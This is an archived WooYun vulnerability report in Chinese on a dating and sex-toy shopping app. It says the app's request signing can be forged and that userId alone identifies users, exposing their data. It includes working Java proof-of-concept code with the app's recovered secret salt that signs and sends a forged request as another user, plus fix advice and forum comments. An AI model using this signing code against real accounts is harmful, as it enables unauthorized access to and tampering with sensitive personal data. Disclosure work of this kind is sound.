{"id": 86992, "wybug_id": "wooyun-2016-0193394", "wybug_title": "盘丝洞两性情趣交友APP设计缺陷导致大量用户信息泄漏/可任意修改用户信息/可进行任意用户操作", "wybug_corp": "盘丝洞", "wybug_author": "灰狗", "wybug_date": "2016-04-07 10:24", "wybug_open_date": "2016-05-22 10:30", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-05-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 盘丝洞两性情趣交友APP 详细说明：  1、APP中android和iOS接口一样的，接收http包也是一样的2、对app进行抓包，burp的包\n\n   重点关注sign参数，签名的 \n\n   非法参数签名3、反编译apk，查找签名算法 \n\n  分析：     1、传入参数进行null检测，true的话怎么new一个     2、添加post请求的一些参数到map中     3、map中的参数名keyset转换成list，进行sort排序     4、new一个string构造，循环取出参数名和值添加到string构造中     5、如果循环完，等于null啦，则在stringbuild中加入salt，进行md5加密，生成sign于是自己写一个出来，方便以后进行请求\n\n于是我们就可以进行任意请求啦，我们发现userid就是唯一的标识，session都是摆设4、大量买过情趣用品的用户信息侧漏\n\n5、各种用户信息越权查询、修改\n\n修改keyvalue和userid，然后进行上述签名，即可进行越权修改   漏洞证明：  \n\n\nimport **.**.**.**.IOException;import **.**.**.**.UnsupportedEncodingException;import **.**.**.**.URLEncoder;import java.util.ArrayList;import java.util.Collections;import java.util.HashMap;import java.util.Iterator;import java.util.Map;import org.jsoup.Jsoup;import org.jsoup.Connection.Method;import org.jsoup.Connection.Response;/** *  * @author huigou * */public class Sign {\t/**\t * \t * @param Screet\t * @param map\t * @return\t * @throws UnsupportedEncodingException\t */\tpublic static Map<String, String> sign(String Screet, Map<String, String> map) throws UnsupportedEncodingException {\t\tif (map == null) {\t\t\tmap = new HashMap<>();\t\t}\t\tmap.put(\"appVersion\", \"4.4.5\");\t\tmap.put(\"platformModel\", \"iPhone 6s\");\t\tmap.put(\"platformType\", \"1\");\t\tmap.put(\"appType\", \"0\");\t\tmap.put(\"v\", \"308\");\t\tmap.put(\"timestamp\", \"1459866463678\");\t\tmap.put(\"lastTime\", \"1459848354294\");\t\tArrayList<String> list = new ArrayList<>(map.keySet());\t\tCollections.sort(list); // 排序\t\tStringBuilder localStringBuilder = new StringBuilder();\t\tIterator<String> iterator = list.iterator();\t\twhile (iterator.hasNext()) {\t\t\tString str1 = iterator.next();\t\t\tString str2 = map.get(str1);\t\t\tif (str2 != null) {\t\t\t\tlocalStringBuilder.append(str1 + \"=\" + URLEncoder.encode(str2, \"UTF-8\"));\t\t\t\tmap.put(str1, str2);\t\t\t} else {\t\t\t\tlocalStringBuilder.append(str1 + \"=\");\t\t\t\tmap.put(str1, \"\");\t\t\t}\t\t}\t\tlocalStringBuilder.append(Screet);\t\tmap.put(\"sign\", MD5.getMD5(localStringBuilder.toString().getBytes()));\t\treturn map;\t}\tpublic static void main(String[] args) throws IOException {\t\tMap<String, String> map = new HashMap<>();\t\tmap.put(\"goodsId\", \"100006\");\t\tmap.put(\"num\", \"1\");\t\tmap.put(\"specifictionId\", \"100008\");\t\tmap.put(\"specifictionName\", \"%E9%AD%94%E5%8A%9B%E7%B2%89\");\t\tmap.put(\"userId\", \"902104\");\t\tMap hMap = Sign.sign(\"LWodY52kWIGOPGLo0189wj5eiYE\", map);\t\tResponse response = Jsoup.connect(\"http://**.**.**.**/mall/cart/add.htm\").method(Method.POST).data(hMap)\t\t\t\t.ignoreContentType(true).execute();\t\tSystem.out.println(response.body());\t}}\n   修复方案：  1、android sign算法针对不存在漏洞的接口，算是多一道防护2、针对存在漏洞的接口，非对称加密是你最好的选择   版权声明：转载请注明来源 灰狗@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评价\n     2016-04-07 11:39 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:44        | 要想Rank给高，标题一定得屌)\t\t \n  呔~哪里来的小号？    \n     2016-04-07 12:28 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:162 漏洞数:65        | 我要是再正常一点就好了)\t\t \n  ^_^    \n     2016-04-07 20:58 |    \t\t放逐 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 白帽子放逐Gg？得失乐与悲与Av Qq205655539)\t\t \n  你们再这么搞老公迟早把所有情趣用品买下来    \n     2016-05-22 10:33 |    \t\t木偶 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 二货.....)\t\t \n  @灰狗最近有一个神器互联哎...可以控制对方的情趣用品！我也在搞这个APP    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}